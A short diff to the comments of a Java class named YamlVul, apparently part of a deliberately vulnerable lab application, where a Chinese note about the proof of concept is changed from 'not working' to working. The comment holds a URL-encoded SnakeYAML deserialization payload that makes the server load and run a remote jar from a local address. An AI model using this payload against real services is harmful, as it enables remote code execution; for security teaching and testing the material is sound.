@@ -27,7 +27,7 @@ public class YamlVul {
      * url 编码：
      *    http://127.0.0.1:28888/RCE/yaml/vul?content=!!javax.script.ScriptEngineManager%20%5B!!java.net.URLClassLoader%20%5B%5B!!java.net.URL%20%5B%22http://127.0.0.1:8000/yaml-payload.jar%22%5D%5D%5D%5D
      *
-     * poc 命令执行不成功，有点问题：
+     * poc 命令执行：
      *    @poc http://127.0.0.1:28888/RCE/yaml/vul?content=!!javax.script.ScriptEngineManager%20%5B!!java.net.URLClassLoader%20%5B%5B!!java.net.URL%20%5B%22http://127.0.0.1:8000/yaml-payload.jar%22%5D%5D%5D%5D
      *
      *
